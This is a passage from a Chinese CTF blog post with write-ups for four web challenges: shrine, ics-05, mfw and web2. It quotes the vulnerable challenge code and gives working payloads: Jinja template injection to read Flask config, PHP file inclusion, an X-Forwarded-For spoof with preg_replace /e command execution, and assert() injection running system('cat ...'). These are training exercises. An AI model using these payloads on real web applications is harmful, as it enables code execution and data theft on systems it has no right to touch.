+<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><p>进入页面有python代码，先进行代码审计</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>flask框架，是一个服务器端模板注入</p>
+<p><code>/shrine/&lt;path:shrine&gt;</code>可以被<code>flask.render_template_string</code>渲染，同时我们看到对小括号进行了替换，将 ( 和 ) 替换为空字符串，config和self是黑名单。</p>
+<p>所以<code>__subclasses__()</code>、<code>&#123;&#123;config&#125;&#125;</code>、<code>&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code>不能用，但是还有别的函数可以用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h3><p>进入环境，根据提示进入云平台设备维护中心，也可以用burp扫描目录发现。</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829144657357.png" alt="image-20210829144657357"></p>
+<p>发现get型参数page=index，并且回显在页面，应该是本地文件包含(LFI)。</p>
+<p>使用hackbar自带的测试语句</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829153518678.png" alt="image-20210829153518678"></p>
+<p>成功显示说明存在本地文件包含漏洞，然后尝试hackbar的php伪协议</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210829165018121.png" alt="image-20210829165018121"></p>
+<p>base64解码得到index.php源码，进行审计</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">@session_start();</span><br><span class="line">posix_setuid(1000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;renderer&quot; content&#x3D;&quot;webkit&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge,chrome&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, maximum-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;layui&#x2F;css&#x2F;layui.css&quot; media&#x3D;&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;设备维护中心&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;ul class&#x3D;&quot;layui-nav&quot;&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;layui-nav-item layui-this&quot;&gt;&lt;a href&#x3D;&quot;?page&#x3D;index&quot;&gt;云平台设备维护中心&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;&#x2F;ul&gt;</span><br><span class="line">    &lt;fieldset class&#x3D;&quot;layui-elem-field layui-field-title&quot; style&#x3D;&quot;margin-top: 30px;&quot;&gt;</span><br><span class="line">        &lt;legend&gt;设备列表&lt;&#x2F;legend&gt;</span><br><span class="line">    &lt;&#x2F;fieldset&gt;</span><br><span class="line">    &lt;table class&#x3D;&quot;layui-hide&quot; id&#x3D;&quot;test&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;html&quot; id&#x3D;&quot;switchTpl&quot;&gt;</span><br><span class="line">        &lt;!-- 这里的 checked 的状态只是演示 --&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;checkbox&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;&#123;&#123;d.id&#125;&#125;&quot; lay-skin&#x3D;&quot;switch&quot; lay-text&#x3D;&quot;开|关&quot; lay-filter&#x3D;&quot;checkDemo&quot; &#123;&#123; d.id&#x3D;&#x3D;1 0003 ? &#39;checked&#39; : &#39;&#39; &#125;&#125;&gt;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;layui&#x2F;layui.js&quot; charset&#x3D;&quot;utf-8&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;table&#39;, function() &#123;</span><br><span class="line">        var table &#x3D; layui.table,</span><br><span class="line">            form &#x3D; layui.form;</span><br><span class="line"></span><br><span class="line">        table.render(&#123;</span><br><span class="line">            elem: &#39;#test&#39;,</span><br><span class="line">            url: &#39;&#x2F;somrthing.json&#39;,</span><br><span class="line">            cellMinWidth: 80,</span><br><span class="line">            cols: [</span><br><span class="line">                [</span><br><span class="line">                    &#123; type: &#39;numbers&#39; &#125;,</span><br><span class="line">                     &#123; type: &#39;checkbox&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;id&#39;, title: &#39;ID&#39;, width: 100, unresize: true, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;name&#39;, title: &#39;设备名&#39;, templet: &#39;#nameTpl&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;area&#39;, title: &#39;区域&#39; &#125;,</span><br><span class="line">                     &#123; field: &#39;status&#39;, title: &#39;维护状态&#39;, minWidth: 120, sort: true &#125;,</span><br><span class="line">                     &#123; field: &#39;check&#39;, title: &#39;设备开关&#39;, width: 85, templet: &#39;#switchTpl&#39;, unresize: true &#125;</span><br><span class="line">                ]</span><br><span class="line">            ],</span><br><span class="line">            page: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    layui.use(&#39;element&#39;, function() &#123;</span><br><span class="line">        var element &#x3D; layui.element; &#x2F;&#x2F;导航的hover效果、二级菜单等功能，需要依赖element模块</span><br><span class="line">        &#x2F;&#x2F;监听导航点击</span><br><span class="line">        element.on(&#39;nav(demo)&#39;, function(elem) &#123;</span><br><span class="line">            &#x2F;&#x2F;console.log(elem)</span><br><span class="line">            layer.msg(elem.text());</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$page &#x3D; $_GET[page];</span><br><span class="line"></span><br><span class="line">if (isset($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (ctype_alnum($page)) &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">        &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center&quot;&gt;</span><br><span class="line">            &lt;p class&#x3D;&quot;lead&quot;&gt;</span><br><span class="line">                &lt;?php</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;input&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (strpos($page, &#39;text&#39;) &gt; 0) &#123;</span><br><span class="line">                    die();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if ($page &#x3D;&#x3D;&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">                    die(&#39;Ok&#39;);</span><br><span class="line">                &#125;</span><br><span class="line">                    include($page);</span><br><span class="line">                    die();</span><br><span class="line">                ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">        &lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $pattern &#x3D; $_GET[pat];</span><br><span class="line">    $replacement &#x3D; $_GET[rep];</span><br><span class="line">    $subject &#x3D; $_GET[sub];</span><br><span class="line"></span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>关键部分就是最后的内部功能，payload：</p>
+<ol>
+<li><p>XFF 头是<code>127.0.0.1</code>，很多插件都可以实现<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831154447334.png" alt="image-20210831154447334"></p>
+</li>
+<li><p><code>preg_replace($pattern, $replacement, $subject);</code>函数使用 <code>/e</code>模式，导致代码执行的问题<br>参考：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
+</li>
+<li><p>所以<code>?pat=/1/e&amp;rep=system(&#39;cat s3chahahaDir/flag/flag.php&#39;)&amp;sub=1</code><br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210831164502945.png" alt="image-20210831164502945"></p>
+</li>
+</ol>
+<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>git泄露，用Githack得到原始结构目录的源码</p>
+<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210820153749371.png" alt="image-20210820153749371"></p>
+<p>打开flag.php没有发现flag，应该是删掉了，但是位置应该还是没变，对index.php源码审计：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>aseert函数可以任意执行代码，<code>or die()</code>指的是如果前面的值为false则执行括号里面的内容，两个aseert都能利用：</p>
+<ol>
+<li><code>?page=1&#39;,&#39;2&#39;) === false and highlight_file(&#39;templates/flag.php&#39;) and strpos(&#39;templates/flag</code></li>
+<li><code>?page=&#39;).system(&quot;cat%20templates/flag.php&quot;);//</code></li>
+</ol>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>代码审计</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$miwen&#x3D;&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;</span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    $_o&#x3D;strrev($str);</span><br><span class="line">    &#x2F;&#x2F; echo $_o;</span><br><span class="line">        </span><br><span class="line">    for($_0&#x3D;0;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c&#x3D;substr($_o,$_0,1);</span><br><span class="line">        $__&#x3D;ord($_c)+1;</span><br><span class="line">        $_c&#x3D;chr($__);</span><br><span class="line">        $_&#x3D;$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    return str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;*</span><br><span class="line">   逆向加密算法，解密$miwen就是flag</span><br><span class="line">*&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>思路已经很明确了，就是逆向解密<code>$miwen</code>。</p>
+<p>先把变量命名给改了，然后逆向解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function decode($miwen)&#123;</span><br><span class="line">   $mingwen&#x3D;&#39;&#39;;</span><br><span class="line">   $miwen&#x3D;base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">   $strrev&#x3D;strrev($miwen);</span><br><span class="line">   for ($i&#x3D;0; $i &lt; strlen($strrev); $i++) &#123; </span><br><span class="line">       </span><br><span class="line">   	    $char&#x3D;substr($strrev,$i,1);  </span><br><span class="line">        $ordchar&#x3D;ord($char)-1;  </span><br><span class="line">        $char&#x3D;chr($ordchar);  </span><br><span class="line">        $mingwen&#x3D;$mingwen.$char;</span><br><span class="line">       </span><br><span class="line">   &#125;</span><br><span class="line">   return $mingwen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$miwen&#x3D;&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;</span><br><span class="line">echo decode($miwen);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://sun-ruijiang.github.io/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/08/09/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CTF攻防世界web新手区2</div>
+      </a>
+    
+  </nav>
+
+  
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Sung
+      </li>
+    </ul>
+    <!-- <ul>
+      <li>
+        
+        
+        
+        powered_by
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul> -->
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Sung&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
